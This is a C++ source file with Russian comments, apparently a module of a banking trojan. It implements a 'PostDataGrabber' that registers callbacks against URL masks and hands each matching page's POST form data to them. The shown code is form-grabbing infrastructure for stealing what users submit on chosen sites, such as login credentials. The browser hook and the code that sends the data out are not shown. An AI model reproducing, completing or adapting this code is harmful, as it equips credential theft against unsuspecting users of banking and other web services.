#include "PostDataGrabber.h"
#include "String.h"
#include "BotClasses.h"
#include "Memory.h"
#include "GetApi.h"
#include "Utils.h"

#include "BotDebug.h"

namespace POSTDATADBG
{
	#include "DbgTemplates.h"
}

#define DBG POSTDATADBG::DBGOutMessage<>

namespace PostDataGrabber
{

PList receivers = 0; //получатели
DWORD PID = 0; //для предотвращения повторной инициализации

//основбождение памяти использованной при создании Receiver
static void DelItemReceiver( void* r )
{
	Receiver* rr = (Receiver*)r;
	STR::Free(rr->urlMask);
}

bool Init()
{
	if( !IsNewProcess(PID) ) //в том же процессе, инициализация уже была
		return true; //инициализация уже была, поэтому говорим, что инициализация успешная
	receivers = List::Create();
	if( !receivers )
		return false;
	List::SetFreeItemMehod( receivers, DelItemReceiver );
	return true;
}

void Release()
{
	List::Free(receivers);
	receivers = 0;
	PID = 0;
}

Receiver* AddReceiver( const char* urlMask, TypeFuncReceiver FuncReceiver )
{
	Receiver* ret = 0;
	if( receivers )
	{
		ret = (Receiver*)MemAlloc( sizeof(Receiver) );
		if( ret )
		{
			ret->urlMask = STR::New( (char*)urlMask, 0 );
			ret->FuncReceiver = FuncReceiver;
			List::Add( receivers, ret );
		}
	}
	return ret;
}

//рассылка событий получателям
void DoEvents( const char* url, const char* postData )
{
	int count = List::Count(receivers);
	for( int i = 0; i < count; i++ )
	{
		Receiver* rv = (Receiver*)List::GetItem( receivers, i );
		bool send = false;
		if( rv->urlMask )
		{
			if( WildCmp( (char*)url, (char*)rv->urlMask ) )
				send = true;
		}
		else
			send = true;
		if( send )
		{
			ParamEvent e;
			e.url = url;
			e.data = postData;
			rv->FuncReceiver(e);
		}
	}
}

};
